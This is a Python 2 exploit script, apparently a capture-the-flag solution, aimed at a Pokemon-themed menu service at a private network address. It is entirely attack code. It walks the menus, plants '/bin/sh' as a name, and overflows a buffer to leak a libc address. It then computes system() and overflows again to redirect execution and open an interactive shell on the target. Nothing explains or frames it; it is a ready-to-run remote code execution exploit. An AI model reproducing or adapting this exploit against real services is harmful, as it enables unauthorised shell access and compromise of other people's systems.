from pwn_expoit import *
def libc():
	s = Netcon('192.168.224.152',4444)
	recvuntil(s,"artwork")
	for i in range(1,5):
		s.send("1\n")
		recvuntil(s,"artwork")
		s.send("1\n")
		recvuntil(s,"3. Run")
		s.send("2\n")
		recvuntil(s,"Pokemon?")
		s.send("name\n")
		recvuntil(s,"artwork")
	for i in range(1,3):
		s.send("1\n")
		recvuntil(s,"artwork")
		s.send("1\n")
		recvuntil(s,"3. Run")
		s.send("2\n")
		recvuntil(s,"Pokemon?")
		s.send("shot\n")
		recvuntil(s,"5. name")
		s.send("2\n")
		recvuntil(s,"artwork")
	s.send("1\n")
	recvuntil(s,"3. Run")
	s.send("1\n")
	recvuntil(s,"3. Run")
	s.send("1\n")
	recvuntil(s,"3. Run")
	s.send("1\n")
	recvuntil(s,"3. Run")
	s.send("1\n")
	recvuntil(s,"3. Run")
	s.send("2\n")
	recvuntil(s,"Pokemon?")
	name = "/bin/sh\x00"
	s.send(name+"\n")
	recvuntil(s,"5. name")
	s.send("3\n")
	recvuntil(s,"artwork")
	s.send("5\n")
	recvuntil(s,"5. name")
	s.send("3\n")
	dat  = ""
	dat += "A"*509
	dat += p32(0x8048512)
	dat += p32(0x8048766)
	dat += "C"*1610
	s.send(dat+"\n")
	recvuntil(s,"artwork")
	s.send("3\n")
	r = u32(recvuntil(s,"artwork")[0xf85:0xf89])
	argv = []
	argv.append(s)
	argv.append(r)
	return argv
def pwn(s,r):
	s.send("5\n")
	recvuntil(s,"5. name")
	s.send("3\n")
	libc_base = r-0xdabd0
	system = libc_base + 0x40190
	print "libc_base : "+hex(libc_base)
	print "system : "+hex(system)
	dat  = ""
	dat += "A"*513
	dat += p32(system)
	dat += "C"*1610
	s.send(dat+"\n")
	recvuntil(s,"artwork")
	s.send("3\n")
	recvuntil(s,"Attack: Tackle")
	interact(s)
argv = libc()
pwn(argv[0],argv[1])
